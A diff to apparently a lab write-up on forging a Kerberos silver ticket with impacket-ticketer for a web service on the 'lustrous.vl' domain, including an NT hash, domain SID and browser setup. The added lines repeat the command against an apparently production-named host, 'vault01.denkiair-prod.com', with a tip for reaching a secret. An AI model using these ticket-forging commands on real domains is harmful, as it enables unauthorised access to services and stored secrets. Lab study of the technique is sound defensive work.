@@ -1462,10 +1462,13 @@ iwr http://lusdc.lustrous.vl/Internal -UseBasicParsing -UseDefaultCredentials
 
 ```bash
 impacket-ticketer -nthash E67AF8B3D78DF5A02EB0D57B6CB60717 -domain-sid S-1-5-21-2355092754-1584501958-1513963426 -domain lustrous.vl -spn HTTP/lusdc.lustrous.vl -user-id 1114 tony.ward
+# impacket-ticketer -nthash A87F3A337D73085C45F9416BE5787D86 -domain-sid S-1-5-21-3313635286-3087330321-3553795959 -domain denkiair-prod -spn HTTP/vault01.denkiair-prod.com -user-id 1190 june.fox
+
 export krb5ccname=tony.ward.ccache
 firefox
 ```
 
 * Have to set “network.negotiate-auth.trusted-uris” to “https://lusdc.lustrous.vl” in about:config in firefox
+* IMPORTANT: Try with netbios domain name (eg: denkiair-prod) instead of FQDN (eg: denkiair-prod.com) if not working as expected (cant see secret..)
 
 </details>
